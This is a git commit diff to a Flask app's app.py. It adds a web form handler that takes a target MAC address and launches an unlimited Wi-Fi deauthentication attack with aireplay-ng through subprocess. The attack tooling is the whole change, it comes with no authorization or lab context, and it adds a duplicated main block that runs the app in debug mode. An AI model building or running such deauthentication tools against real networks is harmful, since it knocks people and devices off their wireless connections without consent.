a52d181cfe65723e8d8958312449c9c064f49655
br0wnboi <akukreja987@gmail.com>
2023-05-11 14:40:39 +0530

    test for attack function

--- app.py
+++ app.py
@@ -23,10 +23,28 @@ def status():
     adapter_status = "Monitor mode"
     return render_template('status.html', adapter_status=adapter_status)
 
-@app.route('/attack')
+@app.route('/attack', methods=['GET', 'POST'])
 def attack():
-    # Logic for the attack page
+    if request.method == 'POST':
+        target_mac = request.form.get('mac')
+        interface = 'wlan0'  # Replace 'wlan0' with your wireless adapter name
+
+        # Execute the deauthentication attack command
+        command = ['aireplay-ng', '--deauth', '0', '-a', target_mac, interface]
+
+        try:
+            output = subprocess.check_output(command, stderr=subprocess.STDOUT, universal_newlines=True)
+            result = "Deauthentication attack completed"
+        except subprocess.CalledProcessError as e:
+            output = e.output
+            result = "Failed to execute deauthentication attack"
+
+        return render_template('attack.html', result=result, output=output)
+
     return render_template('attack.html')
+
+if __name__ == '__main__':
+    app.run(debug=True)
 
 if __name__ == '__main__':
     app.run(debug=True)
